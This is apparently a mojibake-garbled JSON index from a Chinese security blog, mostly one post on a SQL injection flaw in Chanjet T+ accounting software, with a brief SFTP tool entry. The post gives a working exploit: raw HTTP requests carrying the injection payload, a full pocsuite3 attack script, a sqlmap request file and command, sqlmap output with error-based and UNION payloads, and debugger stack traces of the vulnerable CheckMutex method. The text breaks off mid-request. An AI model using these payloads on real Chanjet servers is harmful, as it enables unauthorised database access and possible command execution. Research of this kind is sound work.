Taskbar.","tags":[{"name":"Windows/DeskBand","slug":"Windows-DeskBand","permalink":"https://hodlyounger.github.io/tags/Windows-DeskBand/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"Shellæ‰©å±•","slug":"A-OS/Windows/Shellæ‰©å±•","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Shell%E6%89%A9%E5%B1%95/"}]},{"title":"ã€å·¥å…·ã€‘SFTPå·¥å…·åˆ†äº«","date":"2024-04-09T06:34:21.903Z","path":"G_å·¥å…·/ã€å·¥å…·ã€‘SFTPå·¥å…·/","text":"æ¦‚è¿°ï¼šç”¨æˆ·æœ¬åœ°æ­å»º SFTP çš„å°å·¥å…·ã€‚ ä¸‹è½½é“¾æ¥ é“¾æ¥ï¼šhttps://pan.baidu.com/s/175JTNcqm1lYkenGoDaRkCA?pwd=hi0w æå–ç ï¼šhi0w ä½¿ç”¨è¯´æ˜ å‚è€ƒæ–‡ç« ï¼š å¦‚ä½•åœ¨Windowsæœ¬åœ°å¿«é€Ÿæ­å»ºSFTPæ–‡ä»¶æœåŠ¡å™¨ï¼Œå¹¶é€šè¿‡ç«¯å£æ˜ å°„å®ç°å…¬ç½‘è¿œç¨‹è®¿é—®-é˜¿é‡Œäº‘å¼€å‘è€…ç¤¾åŒº","tags":[{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"https://hodlyounger.github.io/tags/%E5%B7%A5%E5%85%B7/"},{"name":"SFTP","slug":"SFTP","permalink":"https://hodlyounger.github.io/tags/SFTP/"}],"categories":[{"name":"G_å·¥å…·","slug":"G-å·¥å…·","permalink":"https://hodlyounger.github.io/categories/G-%E5%B7%A5%E5%85%B7/"}]},{"title":"ã€QVD-2023-13612ã€‘ç•…æ·é€šT+ SQL æ³¨å…¥æ¼æ´","date":"2024-04-07T00:22:33.512Z","path":"A_å†…åŠŸ/A_POCæ¢ç´¢/ç•…æ·é€š/ã€QVD-2023-13612ã€‘ç•…æ·é€šSQLæ³¨å…¥/","text":"æ¦‚è¿°ï¼šç•…æ·é€šT+ SQL æ³¨å…¥æ¼æ´(å«POC) å…è´£å£°æ˜ï¼šæœ¬æ–‡æ‰€æ¶‰åŠçš„ä¿¡æ¯å®‰å…¨æŠ€æœ¯çŸ¥è¯†ä»…ä¾›å‚è€ƒå’Œå­¦ä¹ ä¹‹ç”¨ï¼Œå¹¶ä¸æ„æˆä»»ä½•æ˜ç¤ºæˆ–æš—ç¤ºçš„ä¿è¯ã€‚è¯»è€…åœ¨ä½¿ç”¨æœ¬æ–‡æä¾›çš„ä¿¡æ¯æ—¶ï¼Œåº”è‡ªè¡Œåˆ¤æ–­å…¶é€‚ç”¨æ€§ï¼Œå¹¶æ‰¿æ‹…ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡é£é™©å’Œè´£ä»»ã€‚æœ¬æ–‡ä½œè€…å¯¹äºè¯»è€…åŸºäºæœ¬æ–‡å†…å®¹æ‰€åšå‡ºçš„ä»»ä½•è¡Œä¸ºæˆ–å†³å®šä¸æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œæœ¬æ–‡ä½œè€…ä¸å¯¹å› ä½¿ç”¨æœ¬æ–‡å†…å®¹è€Œå¯¼è‡´çš„ä»»ä½•ç›´æ¥ã€é—´æ¥ã€ç‰¹æ®Šæˆ–åæœæ€§æŸå¤±æ‰¿æ‹…è´£ä»»ã€‚è¯»è€…åœ¨ä½¿ç”¨æœ¬æ–‡å†…å®¹æ—¶åº”å½“éµå®ˆå½“åœ°æ³•å¾‹æ³•è§„ï¼Œå¹¶ä¿è¯ä¸è¿åä»»ä½•ç›¸å…³æ³•å¾‹æ³•è§„ã€‚ [toc] æ¼æ´è¯´æ˜ ç•…æ·é€šT+SQLæ³¨å…¥æ¼æ´ï¼Œæœªç»èº«ä»½è®¤è¯çš„è¿œç¨‹æ”»å‡»è€…å¯åœ¨æ˜“å—æ”»å‡»ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„SQLè¯­å¥ï¼ŒæŸäº›æƒ…å†µä¸‹æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å¯åœ¨åº•å±‚æ“ä½œç³»ç»Ÿä¸Šæ‰§è¡Œshellå‘½ä»¤ã€‚ POC ç•…æ·é€šT+ 13.0 ç•…æ·é€šT+ 16.0 POC poc 12345678910POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1Host: 192.168.19.137:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36Accept: text/css,*/*;q=0.1Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 53&#123;&quot;accNum&quot;: &quot;3&#x27;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125; ä½¿ç”¨ pocsuit 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293from collections import OrderedDictfrom urllib.parse import urljoinimport refrom pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPEfrom pocsuite3.api import OrderedDict, OptStringfrom urllib3.exceptions import InsecureRequestWarningimport jsonimport osclass ChanJetPOC(POCBase): vulID = &#x27;0&#x27; # ssvid ID å¦‚æœæ˜¯æäº¤æ¼æ´çš„åŒæ—¶æäº¤ PoC,åˆ™å†™æˆ 0 version = &#x27;1&#x27; # é»˜è®¤ä¸º1 author = [&#x27;&#x27;] # PoCä½œè€…çš„å¤§å vulDate = &#x27;2022-09-23&#x27; # æ¼æ´å…¬å¼€çš„æ—¶é—´,ä¸çŸ¥é“å°±å†™ä»Šå¤© createDate = &#x27;2022-09-23&#x27; # ç¼–å†™ PoC çš„æ—¥æœŸ updateDate = &#x27;2022-09-23&#x27; # PoC æ›´æ–°çš„æ—¶é—´,é»˜è®¤å’Œç¼–å†™æ—¶é—´ä¸€æ · references = [&#x27;&#x27;] # æ¼æ´åœ°å€æ¥æº,0dayä¸ç”¨å†™ name = &#x27;ç•…æ·é€šT+ SQLä¸Šä¼ &#x27; # PoC åç§° appPowerLink = &#x27;&#x27; # æ¼æ´å‚å•†ä¸»é¡µåœ°å€ appName = &#x27;ç•…æ·é€šT+&#x27; # æ¼æ´åº”ç”¨åç§° appVersion = &#x27;&#x27;&#x27;13.0 &lt;= ç•…æ·é€šT+å•æœºç‰ˆ&lt;=16.0ä¸”ä½¿ç”¨IIS10.0ä»¥ä¸‹ç‰ˆæœ¬&#x27;&#x27;&#x27; # æ¼æ´å½±å“ç‰ˆæœ¬ vulType = VUL_TYPE.UPLOAD_FILES # æ¼æ´ç±»å‹,ç±»å‹å‚è€ƒè§ æ¼æ´ç±»å‹è§„èŒƒè¡¨ desc = &#x27;&#x27;&#x27; CNVD-2022-60632 ç•…æ·é€šT+ SQLæ¼æ´ &#x27;&#x27;&#x27; # æ¼æ´ç®€è¦æè¿° samples = [&#x27;&#x27;] # æµ‹è¯•æ ·åˆ—,å°±æ˜¯ç”¨ PoC æµ‹è¯•æˆåŠŸçš„ç½‘ç«™ install_requires = [&#x27;&#x27;] # PoC ç¬¬ä¸‰æ–¹æ¨¡å—ä¾èµ–ï¼Œè¯·å°½é‡ä¸è¦ä½¿ç”¨ç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œå¿…è¦æ—¶è¯·å‚è€ƒã€ŠPoCç¬¬ä¸‰æ–¹æ¨¡å—ä¾èµ–è¯´æ˜ã€‹å¡«å†™ pocDesc = &#x27;&#x27;&#x27; æ£€æµ‹:pocsuite -r .\\poc++.py -u url(-f url.txt) --verify &#x27;&#x27;&#x27; category = POC_CATEGORY.EXPLOITS.REMOTE def _verify(self): if self.url.endswith(&quot;/&quot;): path = &quot;tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex&quot; else: path = &quot;/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex&quot; result = &#123;&#125; headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;, &#125; if not self.url.startswith(&#x27;http://&#x27;) and not url.startswith(&#x27;https://&#x27;): url = &#x27;http://&#x27; + self.url url = self.url + path headers[&#x27;Content-Type&#x27;] = &quot;application/x-www-form-urlencoded&quot; data = &#x27;&#x27;&#x27;&#123;&quot;accNum&quot;: &quot;3&#x27;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125; # data = &#x27;&#x27;&#x27;&#123;&quot;accNum&quot;: &quot;3&#x27; AND (select )-- NCab&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125; &#x27;&#x27;&#x27; print(f&quot;æ•°æ®: &#123;data&#125;&quot;) print(f&quot;æ‰«æç›®æ ‡: &#123;url&#125;&quot;) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) repData =requests.post(url, headers=headers, data=data, timeout=1000, verify=False) print(f&quot;å“åº”: &#123;repData.text&#125;&quot;) if &quot;Microsoft SQL Server&quot; in repData.text and &quot;error&quot; not in repData.text: #if repData.status_code == 200: result[&#x27;VerifyInfo&#x27;] = &#123;&#125; result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = url result[&#x27;VerifyInfo&#x27;][&#x27;message&#x27;] = repData.text result[&#x27;VerifyInfo&#x27;][&#x27;shell&#x27;] = self.url + &#x27;/tplus/UFAQD/InitServerInfo.aspx?preload=1&#x27; except Exception as e: print(e) return return self.parse_output(result) def _attack(self): return self._verify() def parse_attack(self, result): output = Output(self) if result: output.success(result) else: output.fail(&#x27;target is not vulnerable&#x27;) return output def _shell(self): return def parse_output(self, result): output = Output(self) if result: output.success(result) else: output.fail(&#x27;target is not vulnerable&#x27;) return outputregister_poc(ChanJetPOC) ä½¿ç”¨ pocsuit æ‰§è¡Œä¸Šè¿° poc ç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š .elucgjdxsify{zoom:80%;} å¯ä»¥çœ‹åˆ°æ‰§è¡Œçš„ POC ä¸º &#123;&quot;accNum&quot;: &quot;3'and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125; ï¼ŒæŸ¥è¯¢è¯­å¥ä¸º select @@version ï¼Œå¹¶ä¸”æŸ¥è¯¢è¿”å›äº† SQL Server çš„ç‰ˆæœ¬ä¸º Microsoft SQL Server 2022 (RTM)â€¦â€¦ã€‚ ä½¿ç”¨ SqlMap æ£€æµ‹ æ ¹æ®ä¸Šè¿° POC ç¼–å†™ sqlmap çš„æ£€æµ‹æ–‡ä»¶ã€‚ 1234567891011# sql.txtPOST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36Accept: text/css,*/*;q=0.1Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 53&#123;&quot;accNum&quot;: &quot;3&#x27;&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125; ä½¿ç”¨ sqlmap æ‰§è¡Œä¸Šè¿°æ£€æµ‹æ–‡ä»¶ï¼Œå¦‚æœä¸º sqlmap ä¸ç†Ÿæ‚‰ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼šã€SQLæ³¨å…¥ã€‘Sqlmapä½¿ç”¨æŒ‡å—(æ‰‹æŠŠæ‰‹ä¿å§†ç‰ˆ)æŒç»­æ›´æ–°_web union sql æ³¨å…¥ æµ‹è¯•å·¥å…·-CSDNåšå®¢ 1python sqlmap.py -r sql.txt --random-agent -v 3 --dbms mssql --hex -p &quot;accNum&quot; --batch è¿™é‡Œå¯¹ä¸Šè¿°æ‰§è¡Œå‘½ä»¤ç¨åŠ è¯´æ˜ï¼š -r: æŒ‡å®šä»æ–‡ä»¶ä¸­åŠ è½½ http è¯·æ±‚ --random-agentï¼šä½¿ç”¨éšæœºé€‰æ‹©çš„HTTP User-Agentå¤´éƒ¨å€¼ -v: è¯¦ç»†çº§åˆ«: 0-6ï¼ˆé»˜è®¤ä¸º1ï¼‰ --dbms: æŒ‡å®šæ˜¯æ•°æ®åº“å --hex: åœ¨æ•°æ®æ£€ç´¢è¿‡ç¨‹ä¸­ä½¿ç”¨åå…­è¿›åˆ¶è½¬æ¢ -p: å¯æµ‹è¯•çš„å‚æ•° --batch: ä¸è¦è¯¢é—®ç”¨æˆ·è¾“å…¥,ä½¿ç”¨é»˜è®¤è¡Œä¸º è¿è¡Œå®Œä¸Šè¿°å‘½ä»¤ä¹‹åå°±ä¼šç”Ÿæˆ sql æ¼æ´ç›¸å…³æ³¨å…¥ç‚¹ï¼Œä»¥ç•…æ·é€š SQL æ¼æ´ä¸ºä¾‹ï¼Œè¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼š 12345678910111213141516sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:---Parameter: JSON accNum ((custom) POST) Type: error-based Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN) Payload: &#123;&quot;accNum&quot;: &quot;3&#x27; AND 3159 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(107)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (3159=3159) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(113)+CHAR(113)))-- zxmb&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125; Vector: AND [RANDNUM] IN (SELECT (&#x27;[DELIMITER_START]&#x27;+([QUERY])+&#x27;[DELIMITER_STOP]&#x27;)) Type: UNION query Title: Generic UNION query (NULL) - 22 columns Payload: &#123;&quot;accNum&quot;: &quot;3&#x27; UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(120)+CHAR(107)+CHAR(106)+CHAR(113)+CHAR(72)+CHAR(103)+CHAR(87)+CHAR(72)+CHAR(115)+CHAR(109)+CHAR(84)+CHAR(82)+CHAR(117)+CHAR(65)+CHAR(80)+CHAR(105)+CHAR(112)+CHAR(84)+CHAR(81)+CHAR(66)+CHAR(116)+CHAR(120)+CHAR(73)+CHAR(103)+CHAR(106)+CHAR(79)+CHAR(71)+CHAR(102)+CHAR(80)+CHAR(110)+CHAR(104)+CHAR(75)+CHAR(113)+CHAR(116)+CHAR(82)+CHAR(114)+CHAR(112)+CHAR(117)+CHAR(82)+CHAR(104)+CHAR(89)+CHAR(105)+CHAR(114)+CHAR(73)+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(113)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- nhDS&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125; Vector: UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]---web server operating system: Windowsweb application technology: Nginx 1.16.1, ASP.NET, ASP.NET 4.0.30319back-end DBMS: Microsoft SQL Server 2022 ä»¥ä¸‹æ˜¯ã€æ–‡å¿ƒä¸€è¨€ã€‘å¯¹ä¸Šè¿°ç»“æœçš„è§£è¯»ï¼š SQLMap çš„è¾“å‡ºæ˜¾ç¤ºäº†å®ƒå·²è¯†åˆ«åˆ°çš„ SQL æ³¨å…¥ç‚¹ï¼Œå¹¶æä¾›äº†è¯¦ç»†çš„æ³¨å…¥ç±»å‹å’Œå¯¹åº”çš„ payloadã€‚è¿™æ˜¯å®ƒè‡ªåŠ¨æ£€æµ‹åˆ°çš„æ½œåœ¨å®‰å…¨æ¼æ´ã€‚ ä»¥ä¸‹æ˜¯å…³äºè¾“å‡ºçš„ä¸€äº›è§£é‡Šï¼š æ³¨å…¥ç‚¹ä¿¡æ¯ å‚æ•°ï¼šJSON accNum æ˜¯ä¸€ä¸ª JSON æ ¼å¼çš„ POST è¯·æ±‚å‚æ•°ï¼Œå®ƒæ˜¯ SQL æ³¨å…¥çš„å…¥å£ç‚¹ã€‚ ç±»å‹ error-basedï¼šåŸºäºé”™è¯¯çš„æ³¨å…¥ç±»å‹ï¼Œå®ƒåˆ©ç”¨æ•°æ®åº“é”™è¯¯æ¶ˆæ¯æ¥æ¨æ–­ SQL æŸ¥è¯¢çš„ç»“æ„ã€‚ UNION queryï¼šUNION æŸ¥è¯¢æ³¨å…¥ç±»å‹ï¼Œå®ƒåˆ©ç”¨ SQL çš„ UNION è¯­å¥æ¥åˆå¹¶å¤šä¸ªæŸ¥è¯¢ç»“æœã€‚ Payload Payload æ˜¯ SQLMap æ„é€ çš„æ¶æ„è¾“å…¥ï¼Œç”¨äºè§¦å‘ SQL æ³¨å…¥å¹¶æå–ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œ3' AND 3159 IN (SELECT ... å°±æ˜¯ä¸€ä¸ªç”¨äºè§¦å‘åŸºäºé”™è¯¯çš„æ³¨å…¥çš„ payloadã€‚ Vector Vector æ˜¯ SQLMap ä½¿ç”¨çš„æ³¨å…¥æ¨¡æ¿ï¼Œç”¨äºæ„é€ å…·ä½“çš„ payloadã€‚ Web æœåŠ¡å™¨æ“ä½œç³»ç»Ÿå’ŒæŠ€æœ¯ SQLMap è¿˜è¯†åˆ«äº†ç›®æ ‡æœåŠ¡å™¨çš„æ“ä½œç³»ç»Ÿï¼ˆWindowsï¼‰ä»¥åŠä½¿ç”¨çš„ web æŠ€æœ¯ï¼ˆNginx 1.16.1, ASP.NET, ASP.NET 4.0.30319ï¼‰ã€‚ åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ è¯†åˆ«å‡ºçš„åç«¯æ•°æ®åº“æ˜¯ Microsoft SQL Server 2022ã€‚ æ ¹æ®è¿™äº›ä¿¡æ¯ï¼Œæ‚¨å¯ä»¥è¿›ä¸€æ­¥åˆ†æç›®æ ‡ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œå¹¶è€ƒè™‘é‡‡å–é€‚å½“çš„æªæ–½æ¥ä¿®å¤è¿™äº› SQL æ³¨å…¥æ¼æ´ã€‚è¿™å¯èƒ½åŒ…æ‹¬æ›´æ–°æˆ–ä¿®è¡¥åº”ç”¨ç¨‹åºä»£ç ã€ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢æˆ–é¢„ç¼–è¯‘çš„è¯­å¥æ¥é˜²æ­¢ SQL æ³¨å…¥ï¼Œä»¥åŠé™åˆ¶å¯¹æ•°æ®åº“çš„è®¿é—®æƒé™ç­‰ã€‚ è¯·æ³¨æ„ï¼Œåœ¨å®é™…ç¯å¢ƒä¸­ï¼Œä¸€æ—¦å‘ç°äº† SQL æ³¨å…¥æ¼æ´ï¼Œæ‚¨åº”è¯¥ç«‹å³é€šçŸ¥ç›¸å…³çš„ç³»ç»Ÿç®¡ç†å‘˜æˆ–å®‰å…¨å›¢é˜Ÿï¼Œå¹¶é¿å…æœªç»æˆæƒåœ°è®¿é—®æˆ–åˆ©ç”¨è¿™äº›æ¼æ´ã€‚ å †æ ˆåˆ†æ SQL æ‰§è¡Œå †æ ˆ SQL æ‰§è¡Œå‡½æ•°ï¼š ExecuteReader æ‰§è¡Œçš„ SQL æ³¨å…¥çš„å‚æ•°ï¼š â€œselect id,UseLogID,Acaa_Num,UserID,UserName,PersonName,Url,HostAddress,HostName,FunctionTag,FunctionName,BeginTime,State,Version,Description,TaskID,ModelClassType,ModelType,ClientType,ServerAddress from EAP_Mutex with(nolock) where userid &lt;&gt; Nâ€™â€™ and Acaa_Num = Nâ€™6â€™and (select @@version)&gt;0-- Nâ€™ and Version = â€˜YWTPro Nâ€™ order by begintimeâ€ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051System.Data.dll!System.Data.SqlClient.SqlCommand.ExecuteReader(System.Data.CommandBehavior behavior, string method) (IL=0x0000, Native=0x00007FF928E40F90+0x37)// åŸå‹// Token: 0x060019A2 RID: 6562 RVA: 0x000B587C File Offset: 0x000B4C7Cinternal SqlDataReader ExecuteReader(CommandBehavior behavior, string method)&#123; SqlConnection.ExecutePermission.Demand(); this._pendingCancel = false; SqlStatistics statistics = null; TdsParser target = null; RuntimeHelpers.PrepareConstrainedRegions(); bool success = false; int? sqlExceptionNumber = null; SqlDataReader result; try &#123; this.WriteBeginExecuteEvent(); target = SqlInternalConnection.GetBestEffortCleanupTarget(this._activeConnection); statistics = SqlStatistics.StartTimer(this.Statistics); SqlDataReader sqlDataReader = this.RunExecuteReader(behavior, RunBehavior.ReturnImmediately, true, method); success = true; result = sqlDataReader; &#125; catch (SqlException ex) &#123; sqlExceptionNumber = new int?(ex.Number); throw; &#125; catch (OutOfMemoryException e) &#123; this._activeConnection.Abort(e); throw; &#125; catch (StackOverflowException e2) &#123; this._activeConnection.Abort(e2); throw; &#125; catch (ThreadAbortException e3) &#123; this._activeConnection.Abort(e3); SqlInternalConnection.BestEffortCleanup(target); throw; &#125; finally &#123; SqlStatistics.StopTimer(statistics); this.WriteEndExecuteEvent(success, sqlExceptionNumber, true); &#125; return result;&#125; æ¼æ´å †æ ˆ 12345678910111213141516171819Ufida.T.SM.UIP.dll!Ufida.T.SM.UIP.MultiCompanyController.CheckMutex(string url, string accNum, string functionTag) (IL=prolog, Native=0x00007FF8F4474D30+0x0) [æœ¬æœºåˆ°æ‰˜ç®¡çš„è½¬æ¢] mscorlib.dll!System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(object obj, object[] parameters, object[] arguments) (ILâ‰ˆ0x0016, Native=0x00007FF94CA3F9A0+0x84) mscorlib.dll!System.Reflection.RuntimeMethodInfo.Invoke(object obj, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, object[] parameters, System.Globalization.CultureInfo culture) (IL=epilog, Native=0x00007FF94CA57300+0x92) mscorlib.dll!System.Reflection.MethodBase.Invoke(object obj, object[] parameters) (IL=epilog, Native=0x00007FF94CAD6AE0+0x22) AjaxPro.2.dll!AjaxPro.AjaxProcHelper.Run() (ILâ‰ˆ0x066C, Native=0x00007FF8F44599A0+0xAD3) AjaxPro.2.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context) (IL=0x0010, Native=0x00007FF8F4459900+0x3A) System.Web.dll!System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute() (ILâ‰ˆ0x018D, Native=0x00007FF93CA37CD0+0x21E) System.Web.dll!System.Web.HttpApplication.ExecuteStepImpl(System.Web.HttpApplication.IExecutionStep step) (IL=epilog, Native=0x00007FF93C9FADA0+0x4B) System.Web.dll!System.Web.HttpApplication.ExecuteStep(System.Web.HttpApplication.IExecutionStep step, ref bool completedSynchronously) (ILâ‰ˆ0x0015, Native=0x00007FF93C9FAE00+0x5D) System.Web.dll!System.Web.HttpApplication.PipelineStepManager.ResumeSteps(System.Exception error) (ILâ‰ˆ0x027A, Native=0x00007FF93CA0E650+0x5CF) System.Web.dll!System.Web.HttpApplication.BeginProcessRequestNotification(System.Web.HttpContext context, System.AsyncCallback cb) (IL=0x0031, Native=0x00007FF93C9F9AB0+0x7D) System.Web.dll!System.Web.HttpRuntime.ProcessRequestNotificationPrivate(System.Web.Hosting.IIS7WorkerRequest wr, System.Web.HttpContext context) (ILâ‰ˆ0x00B0, Native=0x00007FF93CA0CCA0+0xE0) System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotificationHelper(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, int flags) (ILâ‰ˆ0x0131, Native=0x00007FF93C9FBE90+0x4DC) System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotification(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, int flags) (ILâ‰ˆ0x0000, Native=0x00007FF93C9FBE50+0x14) [æ‰˜ç®¡åˆ°æœ¬æœºçš„è½¬æ¢] System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotificationHelper(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, int flags) (ILâ‰ˆ0x01E7, Native=0x00007FF93C9FBE90+0x607) System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotification(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, int flags) (ILâ‰ˆ0x0000, Native=0x00007FF93C9FBE50+0x14) [ç¨‹åºåŸŸè½¬æ¢] ä¸»è¦çœ‹æ–¹æ³• Ufida.T.SM.UIP.dll!Ufida.T.SM.UIP.MultiCompanyController.CheckMutex(string url, string accNum, string functionTag) å…¥å‚å¦‚ä¸‹æ‰€ç¤ºï¼š å…¶ä¸­ CheckMutex çš„å±æ€§ä¸º AjaxMethod ï¼Œç„¶åæˆ‘ä»¬æ ¹æ®å…¥å‚æä¾›å¯¹åº”çš„å‚æ•°å³å¯ã€‚ å¯ä»¥çœ‹åˆ°éœ€è¦æ»¡è¶³ functionTag ä¸º SYS0104ï¼Œæ‰èƒ½æ‰§è¡Œ CheckUserFunction å‡½æ•°ï¼Œè€Œ CheckUserFunction æ‰§è¡Œçš„å°±æ˜¯ accNum çš„å€¼ã€‚ ç„¶ååœ¨æ‰§è¡Œç•…æ·é€šæ¥å£ Ufida.T.EAP.Mutex.Interface.IMutex.CheckUserFunction æ—¶æŠ¥äº†å¼‚å¸¸ï¼Œä½†æ˜¯ä»ç„¶æ‰§è¡Œäº† SQL ã€‚ åœ¨å¼‚å¸¸ä¿¡æ¯ä¸­å¯ä»¥çœ‹åˆ° 1$exception.SqlString = &quot;select id,UseLogID,Acaa_Num,UserID,UserName,PersonName,Url,HostAddress,HostName,FunctionTag,FunctionName,BeginTime,State,Version,Description,TaskID,ModelClassType,ModelType,ClientType,ServerAddress from EAP_Mutex with(nolock) where userid &lt;&gt; N&#x27;&#x27; and Acaa_Num = N&#x27;3&#x27;and (select @@version)&gt;0-- N&#x27; and Version = &#x27;YWTPro N&#x27; order by begintime&quot; å¯ä»¥çœ‹ä¸‹æ³¨å…¥å‰ä¸æ³¨å…¥åçš„SQLè¯­å¥å¯¹æ¯”ï¼š 12345678910111213141516171819202122232425262728293031323334353637select id, UseLogID, Acaa_Num, UserID, UserName, PersonName, Url, HostAddress, HostName, FunctionTag, FunctionName, BeginTime, State, Version, Description, TaskID, ModelClassType, ModelType, ClientType, ServerAddressfrom EAP_Mutexwith(nolock)# ä¸Šè¾¹ä»£ç ä¸€è‡´# æ³¨å…¥å‰where userid &lt;&gt; N&#x27;&#x27; and Acaa_Num = N&#x27;3N&#x27; and Version = &#x27;YWTPro N&#x27;# æ³¨å…¥åwhere userid &lt;&gt; N&#x27;&#x27; and Acaa_Num = N&#x27;3&#x27; and (select @@version)&gt;0-- N&#x27; and Version = &#x27;YWTPro N&#x27; ç„¶ååœ¨æ‰§è¡Œæ—¶å› ä¸ºæŠ¥é”™ï¼Œè¿”å›äº†å¼‚å¸¸ä¿¡æ¯ï¼Œä¹Ÿå°±è¿”å›äº†æˆ‘ä»¬è¦æ‰§è¡Œçš„æŸ¥è¯¢ç»“æœï¼Œå¼‚å¸¸æ•æ‰çš„å †æ ˆå¦‚ä¸‹æ‰€ç¤ºï¼š 12345åœ¨ Ufida.T.EAP.Aop.Dynamic.LocalCallDynamicProxyImpl.NormalInvoke(MethodBase method, Object[] args, Boolean needFreeCuid)\\r\\n åœ¨ Ufida.T.EAP.Aop.Dynamic.LocalCallDynamicProxyImpl.Invoke(IMessage message)\\r\\n åœ¨ System.Runtime.Remoting.Proxies.RealProxy.PrivateInvoke(MessageData&amp; msgData, Int32 type)\\r\\n åœ¨ Ufida.T.EAP.Mutex.Interface.IMutex.CheckUserFunction(String accountNum)\\r\\n åœ¨ Ufida.T.SM.UIP.MultiCompanyController.CheckMutex(String url, String accNum, String functionTag) ä½¿ç”¨ dnSpy åç¼–è¯‘ä¹‹åå¯ä»¥çœ‹åˆ°ï¼ŒCheckMutexDelete æ–¹æ³•ä¹Ÿå¯ä»¥ç”¨äºè¯¥æ¼æ´ï¼Œéœ€è¦åœ¨ è¯·æ±‚ä½“æ·»åŠ  dsName å‚æ•°ï¼š 12345678910POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutexDelete HTTP/1.1Host: 192.168.19.137:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36Accept: text/css,*/*;q=0.1Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 